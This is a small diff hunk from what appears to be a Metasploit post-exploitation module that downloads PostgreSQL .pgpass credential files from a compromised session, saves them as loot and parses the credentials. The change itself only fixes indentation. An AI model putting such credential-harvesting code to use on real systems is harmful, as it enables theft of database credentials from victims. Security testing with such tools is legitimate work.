@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Post
 			# Store the loot
 			print_good("Downloading #{f}")
 			pgpass_path = store_loot("postgres.pgpass", "text/plain", session, read_file(f), "#{f}", "pgpass #{f} file")
-            print_good "Postgres credentials file saved to #{pgpass_path}"
+			print_good "Postgres credentials file saved to #{pgpass_path}"
 			# Store the creds
 			parse_creds(f)
 		end
